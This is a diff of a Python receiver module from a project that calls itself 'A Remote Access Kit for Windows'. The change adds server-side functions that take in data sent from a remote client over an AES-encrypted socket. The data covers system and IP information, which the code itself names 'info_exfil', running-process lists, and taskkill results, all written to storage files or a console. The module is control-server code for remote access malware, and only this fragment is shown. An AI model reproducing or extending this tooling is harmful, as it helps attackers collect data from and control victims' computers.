@@ -10,15 +10,16 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.0
+# Build:  1.0.1
 # -------------------------------------------------------------
 import socket
 
-from ..logging.logging import ConsoleWindow
+from ..logging.logging import ConsoleWindow,LoggingUtilitys
 from ..encryption.aes128 import Decryption
 from ..networking.IP_Handler import IPAddress
 from ..utils.file_paths import DSFilePath
 from ..logging.logging import NetworkingConfigs
+import pandas
 
 
 BUFFER = 4096
@@ -76,6 +77,37 @@ class ReceiverSocket:
     def recv_sys_ip_info(self,encryption_key):
         self.create_receiver_socket()                                   #Create receiver socket
         info_exfil = self.get_data_from_client(encryption_key)          #Get the data from the client and decrypt it
-        with open(DSFilePath().sys_info_file,'w') as client_info_file:  #Open the sysinfo.txt data storage file
-            client_info_file.write(info_exfil)                          #Write the info rcvd from the client to the file
-            client_info_file.close()                                    #Close file
+        LoggingUtilitys().write_data_to_file(DSFilePath().sys_info_file,info_exfil) #Write the data to the data storage file
+
+    #Function will receive the list of running process's from the client, format and log it to the data storage directory
+    def recv_running_process(self,encryption_key):
+        self.create_receiver_socket()                               #Create receiver socket
+        process_list = self.get_data_from_client(encryption_key)    #Get process list from client
+        data_line_array = process_list.splitlines()                 #Split the lines of the process list
+        with open(DSFilePath().task_manager_file,'w') as task_file: #Open Data storage file
+            master_array = []                                       #Create master array
+            for line in data_line_array:                            #For each line in the array
+                if line != '':                                      #If the line is not an empty string
+                    array = []                                      #Create array local to loop iteration
+                    for data in line.split(' '):                    #For each piece of data split, to remove whitespace
+                        if data != '':                              #If the data is not an empty string, remove more invalid data
+                            array.append(data)                      #Append the data to the local array
+                    try:
+                        master_array.append(array[7])               #Append the process name
+                        master_array.append(array[5])               #Append the PID
+                        master_array.append(array[4])               #Append the CPU Usage
+                    except IndexError:                  #If there is a missing item from original command output on client, dial back the index by one. This is for proc's that don't have CPU output
+                        master_array.append(array[6])
+                        master_array.append(array[4])
+                        master_array.append(array[3])
+            task_file.write(str(master_array[6:]).strip('[').strip(']')+'\n') #When done with processing, write the data to the data storage file
+            task_file.close()
+
+    #Function will receive the output from the taskkill command
+    def recv_taskkill_output(self,encryption_key):
+        self.create_receiver_socket()                                       #Create receiver socket
+        taskkill_output = self.get_data_from_client(encryption_key)         #Get output of command from client
+        if taskkill_output == '':                                           #If the output == empty string, then the client will send an empty string meaning the proc could not be terminated
+            taskkill_output = 'ERROR: The process could not be terminated.' #Set to error message on server side
+        ConsoleWindow().log_to_console(taskkill_output)                     #Log to console
+        LoggingUtilitys().write_data_to_file(DSFilePath().job_file,'null')  #Create a job file to break the while loop
